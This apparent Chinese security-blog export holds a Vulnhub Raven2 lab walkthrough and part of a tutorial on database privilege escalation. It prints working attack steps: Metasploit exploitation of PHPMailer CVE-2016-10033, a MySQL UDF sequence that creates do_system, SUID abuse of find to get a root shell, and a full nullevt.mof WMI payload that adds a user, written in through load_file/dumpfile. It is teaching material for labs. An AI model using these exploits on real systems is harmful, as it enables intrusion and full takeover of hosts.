<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220305161317582.png" alt="image-20220305161317582"></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220305161244673.png" alt="image-20220305161244673"></p>
<p>这会导致在去寻找环境变量的先后顺序不一样，优先查找前面的路径</p>
<p>linux环境变量参考：<a href="https://blog.csdn.net/rain_yunlx/article/details/78850580">https://blog.csdn.net/rain_yunlx/article/details/78850580</a></p>
</li>
</ol>
<p><a href="https://www.freebuf.com/articles/system/176255.html">利用通配符进行Linux本地提权</a></p>
<p>漏洞前提：需要存在不安全的定时任务</p>
<p>参考：<a href="https://www.freebuf.com/articles/system/251884.html">Linux提权一文通</a></p>
<h2 id="vulnhub靶机渗透-Raven2"><a href="#vulnhub靶机渗透-Raven2" class="headerlink" title="vulnhub靶机渗透-Raven2"></a>vulnhub靶机渗透-Raven2</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p>用nmap探测目标主机</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306132721319.png" alt="image-20220306132721319"></p>
<p>全端口扫描</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306140928548.png" alt="image-20220306140928548"></p>
<p>访问目标地址，翻看网页源码等找寻信息</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306143448027.png" alt="image-20220306143448027"></p>
<p>在BLOG页面发现有wordpress</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306143756262.png" alt="image-20220306143756262"></p>
<p>注意：这里最初访问存在显示不完整，可能是因为网站源码是通过raven.local来访问的，解决办法是将本地hosts文件添加一个域名解析</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306143735048.png" alt="image-20220306143735048"></p>
<p>发现wordpress，直接上wpscan进行扫描（这里使用kali中的wpscan时，可能也需要配置一下hosts域名解析）</p>
<p><code>vim /etc/hosts</code></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306151356302.png" alt="image-20220306151356302"></p>
<p>（其实也不用，最开始是因为地址用的https导致访问不了以为不能扫，才去改的，用<a href="http://192.168.0.184/wordpress%E5%B0%B1%E8%A1%8C%E4%BA%86QAQ%EF%BC%89">http://192.168.184/wordpress就行了QAQ）</a></p>
<p>上面废话一堆，下面直接wpscan走起，<code>wpscan --url http://192.168.184.140/wordpress/ -e vp,vt,tt,u</code></p>
<p><a href="https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation">wpcan介绍及使用</a></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306152846609.png" alt="image-20220306152846609"></p>
<p>wpscan扫描出的有效信息（两个用户名，其他选项扫描无果）</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306153002758.png" alt="image-20220306153002758"></p>
<p>之后再使用dirb扫描目录，发现/vendor目录存在目录遍历</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306141613990.png" alt="image-20220306141613990"></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306141626355.png" alt="image-20220306141626355"></p>
<p>翻看目录发现/PATH下有flag1</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306142347475.png" alt="image-20220306142347475"></p>
<p>继续翻目录，找到PHPMailer相关文件，版本可能是5.2.16</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306143140872.png" alt="image-20220306143140872"></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306143150064.png" alt="image-20220306143150064"></p>
<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>基于前面的信息收集，开始进一步渗透，寻找可以利用的漏洞</p>
<h4 id="PHPMailer远程代码执行"><a href="#PHPMailer远程代码执行" class="headerlink" title="PHPMailer远程代码执行"></a>PHPMailer远程代码执行</h4><p>百度搜索PHPMailer漏洞，发现版本小于5.2.18会存在远程代码执行漏洞（CVE-2016-10033）</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306154731353.png" alt="image-20220306154731353"></p>
<p>直接上msf，进行搜索</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306163239614.png" alt="image-20220306163239614"></p>
<p>选择这个2016年的exp</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306163943533.png" alt="image-20220306163943533"></p>
<p>根据提示访问<code>raven.local/blSkjQ6R.php</code>，成功提示如下（过程可能会比较慢，也可能失败，多run几次exp）</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306163957929.png" alt="image-20220306163957929"></p>
<p>然后<code>sessions 1</code>进入控制台</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306164410610.png" alt="image-20220306164410610"></p>
<p>利用python开启一个交互式shell<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p>使用<code>find / -name flag*</code>找flag文件，找到flag2和flag3</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306165016106.png" alt="image-20220306165016106"></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306165136216.png" alt="image-20220306165136216"></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306165150789.png" alt="image-20220306165150789"></p>
<h3 id="利用MysqlUDF提权"><a href="#利用MysqlUDF提权" class="headerlink" title="利用MysqlUDF提权"></a>利用MysqlUDF提权</h3><p>有了www-data权限后，看能不能将权限提升至root</p>
<p>看看内核，百度后没看到能利用的漏洞</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306171852277.png" alt="image-20220306171852277"></p>
<p>再看看这台服务器还有哪些用户</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306171208934.png" alt="image-20220306171208934"></p>
<p>没想到之前在wordpress收集的两个用户名也是系统用户</p>
<p>再想到刚刚信息收集时有wordpress，于是去看看配置文件</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306165725704.png" alt="image-20220306165725704"></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306165833347.png" alt="image-20220306165833347"></p>
<p>得到mysql的root账户密码</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306165914717.png" alt="image-20220306165914717"></p>
<p>看看数据库里有没有有用的信息</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306170409758.png" alt="image-20220306170409758"></p>
<p>查看wp_users表里的信息</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306170448385.png" alt="image-20220306170448385"></p>
<p>尝试用在cmd5网站解密，发现要钱，觉得一个靶机没必要花钱，而且这两个用户也不一定有很高的权限，那就再从其他地方找突破</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306170741730.png" alt="image-20220306170741730"></p>
<p>于是尝试看看能不能使用UDF提权</p>
<p>使用<a href="https://blog.csdn.net/z13546335640/article/details/115645029">ps -aux|grep mysql</a>查看mysql的运行权限，来判断能否使用mysql提权</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306172759814.png" alt="image-20220306172759814"></p>
<p>可以看到是以root身份运行，可以利用UDF提权</p>
<p>还有一种做法也会想到用UDF提权，python搭建以一个简易的服务器来把Linux枚举漏洞工具LinEnum下载到靶机里面，命令：<code>python -m SimpleHTTPServer 5555</code>，在靶机用wget下载即可，运行结果中会出现如下的显示，及表示可以利用UDF提权</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306174533030.png" alt="image-20220306174533030"></p>
<p>好，接下来正式开始UDF提权</p>
<p>利用Google搜索exp</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306174907764.png" alt="image-20220306174907764"></p>
<p>找到<a href="https://www.exploit-db.com/exploits/1518%EF%BC%88%E9%93%BE%E6%8E%A5%E9%87%8C%E6%9C%89usage%EF%BC%89">https://www.exploit-db.com/exploits/1518（链接里有usage）</a></p>
<p>usage如下：</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306175744587.png" alt="image-20220306175744587"></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306175835660.png" alt="image-20220306175835660"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">mysql&gt; insert into foo values(load_file(&#x27;/tmp/udf.so&#x27;));</span><br><span class="line">mysql&gt; select * from foo into dumpfile &#x27;%plugin%/udf.so&#x27;;</span><br><span class="line">mysql&gt; create function do_system returns integer soname &#x27;udf.so&#x27;;</span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line"></span><br><span class="line"># 这里的%plugin%是mysql插件所在路径</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306180727554.png" alt="image-20220306180727554"></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306180946828.png" alt="image-20220306180946828"></p>
<p>下面结合SUID进行提权，给find附上suid权限</p>
<p><code>select do_system(&#39;chmod u+s /usr/bin/find&#39;);</code></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306181230586.png" alt="image-20220306181230586"></p>
<p>接下来利用find便可以执行root权限的命令</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306182228849.png" alt="image-20220306182228849"></p>
<p>可以利用find返回一个root权限的shell<code>find / -exec &#39;/bin/sh&#39; \;</code></p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306182434311.png" alt="image-20220306182434311"></p>
<p>最后我们访问/root目录找到最后一个flag，flag4.txt</p>
<p><img src="/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220306182541638.png" alt="image-20220306182541638"></p>
<p>到此圆满渗透结束，<em>★,°</em>:.☆(￣▽￣)/$:<em>.°★</em> 。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_34801745/article/details/103753259">https://blog.csdn.net/qq_34801745/article/details/103753259</a></p>
<p><a href="https://blog.csdn.net/nzjdsds/article/details/93971746">https://blog.csdn.net/nzjdsds/article/details/93971746</a></p>
<h2 id="Linux提权简单总结"><a href="#Linux提权简单总结" class="headerlink" title="Linux提权简单总结"></a>Linux提权简单总结</h2><ol>
<li>提权环境，信息收集（SUID，定时任务，可能漏洞，第三方服务应用等）</li>
<li>最新相关漏洞要明确（随时关注），二次开发相关漏洞探针脚本</li>
<li>本地searchspoit脚本及远程<a href="https://github.com/offensive-security/exploitdb">exploitdb</a>站点搜索说明（简要使用）</li>
<li>其他提权方法：密码复用，guid，sudo等（需要运气，比较鸡肋）<a href="https://www.freebuf.com/vuls/217089.html">SUDO参考</a></li>
</ol>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>linux提权</tag>
      </tags>
  </entry>
  <entry>
    <title>MY&amp;MS&amp;ORA等数据库提权</title>
    <url>/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码。除Access数据库外，其他数据库基本都存在数据库提权的可能。</p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83.png" alt="数据库提权"></p>
<p>数据库应用提权在权限提升中的意义：在使用漏洞提权无果时，考虑数据库提权</p>
<p>WEB或本地环境如何探针数据库应用</p>
<p>数据库提权权限用户密码收集等方法</p>
<p>目前数据库提权对应的技术及方法等</p>
<h2 id="mysql数据库提权-脚本-amp-MSF"><a href="#mysql数据库提权-脚本-amp-MSF" class="headerlink" title="mysql数据库提权-脚本&amp;MSF"></a>mysql数据库提权-脚本&amp;MSF</h2><p>流程：服务探针-&gt;信息收集-&gt;提权利用-&gt;获取权限</p>
<p>tips：mysql在windows下提权主要借助于root用户有系统权限</p>
<h3 id="UDF-Userdefined-function-提权（基于mysql调用命令执行函数）"><a href="#UDF-Userdefined-function-提权（基于mysql调用命令执行函数）" class="headerlink" title="UDF(Userdefined function)提权（基于mysql调用命令执行函数）"></a>UDF(Userdefined function)提权（基于mysql调用命令执行函数）</h3><h4 id="信息收集（主要是root密码收集）"><a href="#信息收集（主要是root密码收集）" class="headerlink" title="信息收集（主要是root密码收集）"></a>信息收集（主要是root密码收集）</h4><ol>
<li><p>读取网站数据库配置文件（了解其命名规则及查找技巧）</p>
<p>关键字：sql data inc config conn database common include等</p>
</li>
<li><p>读取数据库存储或备份文件（了解数据库存储格式及对应内容）</p>
<p>@@basedir/data/数据库名/表名.MYD（这里@@basedir是mysql安装目录）</p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20220302143745397.png" alt="image-20220302143745397"></p>
<p>root密码在mysql/user.MYD</p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20220302143949566.png" alt="image-20220302143949566"></p>
</li>
<li><p>利用脚本暴力破解（数据库root账户是否支持外联及如何开启外联）</p>
<p>远程需要root账户可以外连</p>
<p>服务器本地爆破，把爆破脚本上传至服务器，就可以不用root外连</p>
</li>
</ol>
<p>注意：提权需要注意mysql的版本，版本&lt;5.1到处目录为<code>c:/windows或system32</code>，版本&gt;5.1到处目录为<code>mysql根目录的lib/plugin</code>，但mysql5.1以上版本默认没有plugin目录，需要自行创建</p>
<p>查看版本使用<code>select version;</code></p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20220302144024157.png" alt="image-20220302144024157"></p>
<p>还需要注意windows下mysql默认为system权限,linux下mysql仅为mysql权限，所以linux下不适用udf提权，<strong>除非linux下mysql的的运行UID是root</strong>（使用<a href="https://blog.csdn.net/z13546335640/article/details/115645029">ps -aux|grep mysql</a>查看mysql的运行权限，来判断能否使用mysql提权）</p>
<h4 id="参考b"><a href="#参考b" class="headerlink" title="参考b"></a>参考b</h4><p><a href="https://www.cnblogs.com/litlife/p/9030673.html">udf提权原理详解-Windows</a></p>
<p><a href="https://www.cnblogs.com/PaineLei/p/14065515.html">UDF提权-踩坑-Linux</a></p>
<h3 id="MOF（基于mysql特性的安全问题）"><a href="#MOF（基于mysql特性的安全问题）" class="headerlink" title="MOF（基于mysql特性的安全问题）"></a>MOF（基于mysql特性的安全问题）</h3><p>MOF提权的条件要求十分严苛：</p>
<ol>
<li>windows 03及以下版本</li>
<li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li>
<li>secure-file-priv参数不为null</li>
</ol>
<h4 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h4><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。</p>
<h4 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h4><p>MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
<h4 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h4><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line">#pragma name<span class="built_in">space</span>(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>;</span><br><span class="line">Name = <span class="string">&quot;filtP2&quot;</span>;</span><br><span class="line">Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span></span><br><span class="line"><span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="string">&quot;And TargetInstance.Second = 5&quot;</span>;</span><br><span class="line">QueryLanguage = <span class="string">&quot;WQL&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">&quot;consPCSV2&quot;</span>;</span><br><span class="line">ScriptingEngine = <span class="string">&quot;JScript&quot;</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe user hpdoger <span class="number">123456</span> /add\<span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>将上面的脚本上传到有读写权限的目录下：</p>
<p>这里我上传到了<code>C:\Documents and Settings\test</code></p>
<p>根据前面的phpmyadmin，我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下<br>payload:<code>select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></p>
<p>当我们成功把mof导出时，mof就会直接被执行，且5秒创建一次用户。</p>
<h4 id="关于Mof提权的弊端"><a href="#关于Mof提权的弊端" class="headerlink" title="关于Mof提权的弊端"></a>关于Mof提权的弊端</h4><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p>
<p>cmd 下运行下面语句:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line">del c:<span class="regexp">/windows/</span>system32<span class="regexp">/wbem/</span>repository</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>



<h3 id="启动项（基于配合操作系统自启动）"><a href="#启动项（基于配合操作系统自启动）" class="headerlink" title="启动项（基于配合操作系统自启动）"></a>启动项（基于配合操作系统自启动）</h3><p>一般拿到root账户后，我们可以开启外连来做更多的事<code>GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;root&#39; WITH GRANT OPTION;</code></p>
<p>开启外连后，可以利用远程msf来添加启动项进行提权</p>
<p>先在msf中搜索<code>search mysql</code></p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20220303000453446.png" alt="image-20220303000453446"></p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20220303000838678.png" alt="image-20220303000838678"></p>
